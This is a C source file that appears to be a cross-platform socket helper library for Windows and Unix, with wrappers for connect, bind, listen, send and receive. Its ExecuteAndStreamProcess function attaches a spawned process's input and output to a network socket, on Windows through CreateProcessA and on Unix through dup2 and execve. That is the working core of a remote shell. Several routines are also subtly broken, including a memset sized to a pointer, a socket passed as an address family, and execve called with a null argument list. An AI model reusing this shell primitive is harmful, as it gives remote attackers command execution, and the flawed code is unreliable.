#include "../include/socket.h"

#ifdef _WIN32

    SOCKET Socket(short family,int type,int protocol)
    {
        struct WSADATA wsa;
        WSAStartup(MAKEWORD(2,2),&wsa);
        return (WSASocketA(family,type,protocol,0,0,0));
    }

    int Connect(SOCKET fd,const char *host,int port)
    {
        struct sockaddr_in ss = session(host,port);
        return (WSAConnect(fd,(SOCKADDR *)&ss,sizeof(ss),0,0,0,0));
    }

    int Bind(SOCKET fd,int port)
    {
        SOCKADDR_IN config = sessionbind(AF_INET,port);
        return (bind(fd,(SOCKADDR *)&config,sizeof(config)));
    }

    int Listen(SOCKET fd,int maxcon)
    {
        return (listen(fd,maxcon));
    }

    SOCKET Accept(SOCKET fd)
    {
        SOCKET csock;
        SOCKADDR_IN csin = {0};
        int sinsize = sizeof(csin);
        return (accept(fd,(SOCKADDR *)&csin,&sinsize));
    }

    int Send(SOCKET fd,const char *data,int flags)
    {
        return (send(fd,data,strlen(data),flags));
    }

    int SendTimeout(SOCKET fd,const char *data,unsigned long ms,int flags)
    {
        Sleep(ms);
        return (send(fd,data,strlen(data),flags));
    }

    int RecvData(SOCKET fd,char *buffer,int bytes,int flags)
    {
        if (buffer == NULL)
        {
            return (0);
        }

        memset(buffer,0,sizeof(buffer));
        rdata(fd,buffer,(bytes-1),flags);
        if (buffer != NULL)
        {
            return (strlen(buffer));
        }
        return (0);
    }

    int RecvDataTimeout(SOCKET fd,char *buffer,int bytes,int flags,unsigned long ms)
    {
        if (buffer == NULL)
        {
            return (SOCKET_ERROR);
        }
        
        Sleep(ms);

        memset(buffer,0,sizeof(buffer));
        rdata(fd,buffer,(bytes-1),flags);
        if (buffer != NULL)
        {
            return (strlen(buffer));
        }
        
        return (SOCKET_ERROR);
    }

    peer_t GetPeerName(SOCKET fd)
    {
        SOCKADDR_IN peer = {0};
        peer_t p;
        socklen_t sizepeer = sizeof(peer);

        getpeername(fd,(SOCKADDR*)&peer,&sizepeer);
       
        p.address = inet_ntoa(peer.sin_addr);
        p.port = ntohs(peer.sin_port);

        return (p);
    }

    int rdata(SOCKET s, char* buffer, int len,int flags)
    {
        int i;
        i = recv(s, buffer, len, flags);
        if (i > 0) {
            return i;
        }
        else if (i == 0) {
            return 0;
        }
        else {
            return -1;
        }
    }

    SOCKADDR_IN session(const char *host,int port)
    {
        struct sockaddr_in s = {0};
        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(host);
        s.sin_port = htons(port);
        return (s);
    }

    SOCKADDR_IN sessionbind(short family,int port){
        struct sockaddr_in s;
        s.sin_family = family;
        s.sin_addr.s_addr = htonl(INADDR_ANY);
        s.sin_port = htons(port);
        return (s);
    }

    void ExecuteAndStreamProcess(SOCKET fd,const char *process)
    {
        STARTUPINFO s;
        PROCESS_INFORMATION p;
        memset(&s,0,sizeof(s));
        memset(&p,0,sizeof(p));
        s.cb = sizeof(s);
        s.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        s.hStdError = (HANDLE)fd;
        s.hStdInput = (HANDLE)fd;
        s.hStdOutput = (HANDLE)fd;
        CreateProcessA(NULL,(LPSTR)process,NULL,NULL,TRUE,0,NULL,NULL,(LPSTARTUPINFOA)&s,&p);
        WaitForSingleObject(p.hProcess,INFINITE);
        CloseHandle(p.hProcess);
        CloseHandle(p.hThread);
    }

#elif __unix__

    SOCKET Socket(short family,int type,int protocol)
    {
        return (socket(family,type,protocol));
    }

    int Connect(SOCKET fd,const char *host,int port)
    {
        struct sockaddr_in ss = session(host,port);
        return (connect(fd,(SOCKADDR *)&ss,sizeof(ss)));
    }

    int Bind(SOCKET fd,int port)
    {
        SOCKADDR_IN config = sessionbind(fd,port);
        return (bind(fd,(SOCKADDR *)&config,sizeof(config)));
    }

    int Listen(SOCKET fd,int maxcon)
    {
        return (listen(fd,maxcon));
    }

    SOCKET Accept(SOCKET fd)
    {
        SOCKET csock;
        SOCKADDR_IN csin = {0};
        int sinsize = sizeof(csin);
        return (accept(fd,(SOCKADDR *)&csin,&sinsize));
    }

    int Send(SOCKET fd,const char *data,int flags)
    {
        return (send(fd,data,strlen(data),flags));
    }

    int SendTimeout(SOCKET fd,const char *data,int seconds,int flags)
    {
        sleep(seconds);
        return (send(fd,data,strlen(data),flags));
    }

    int RecvData(SOCKET fd,char *buffer,int bytes,int flags)
    {
        if (buffer == NULL)
        {
            return (0);
        }

        memset(buffer,0,sizeof(buffer));
        rdata(fd,buffer,(bytes-1),flags);
        if (buffer != NULL)
        {
            return (strlen(buffer));
        }
        return (0);
    }

    int RecvDataTimeout(SOCKET fd,char *buffer,int bytes,int flags,int seconds)
    {
        if (buffer == NULL)
        {
            return (SOCKET_ERROR);
        }
        
        sleep(seconds);

        memset(buffer,0,sizeof(buffer));
        rdata(fd,buffer,(bytes-1),flags);
        if (buffer != NULL)
        {
            return (strlen(buffer));
        }
        
        return (SOCKET_ERROR);
    }

    peer_t GetPeerName(SOCKET fd)
    {
        SOCKADDR_IN peer = {0};
        peer_t p;
        socklen_t sizepeer = sizeof(peer);
        
        getpeername(fd,(SOCKADDR*)&peer,&sizepeer);
       
        p.address = inet_ntoa(peer.sin_addr);
        p.port = ntohs(peer.sin_port);

        return (p);
    }

    int rdata(SOCKET s, char* buffer, int len,int flags)
    {
        int i;
        i = recv(s, buffer, len, flags);
        if (i > 0) {
            return i;
        }
        else if (i == 0) {
            return 0;
        }
        else {
            return -1;
        }
    }

    SOCKADDR_IN session(const char *host,int port)
    {
        struct sockaddr_in s = {0};
        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(host);
        s.sin_port = htons(port);
        return (s);
    }

    SOCKADDR_IN sessionbind(short family,int port){
        struct sockaddr_in s;
        s.sin_family = family;
        s.sin_addr.s_addr = htonl(INADDR_ANY);
        s.sin_port = htons(port);
        return (s);
    }

    void ExecuteAndStreamProcess(SOCKET fd,const char *process)
    {
        dup2(fd,0);
        dup2(fd,1);
        dup2(fd,2);
        execve(process,NULL,NULL);
    }

#endif
